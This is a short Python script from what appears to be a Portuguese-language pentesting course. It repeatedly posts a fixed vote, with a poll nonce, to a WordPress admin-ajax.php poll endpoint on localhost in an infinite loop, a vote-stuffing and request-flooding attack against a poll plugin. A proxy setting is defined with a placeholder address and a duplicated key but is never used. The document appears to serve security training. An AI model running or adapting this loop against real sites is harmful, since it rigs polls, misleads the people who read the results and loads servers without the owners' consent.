#####################################
# Python para Pentesters            #
# https://solyd.com.br/treinamentos #
#####################################

import requests

dados = {"action": "polls",
         "view": "process",
         "poll_id": "2",
         "poll_2": "7",
         "poll_2_nonce": "af658e1b0e"
         }

proxy_dict = {'http': 'http://ipdopoxy',
              'http': 'http://ipdopoxy'}

url = 'http://localhost/wordpress/wp-admin/admin-ajax.php'


while True:
    requests.post(url, data=dados)
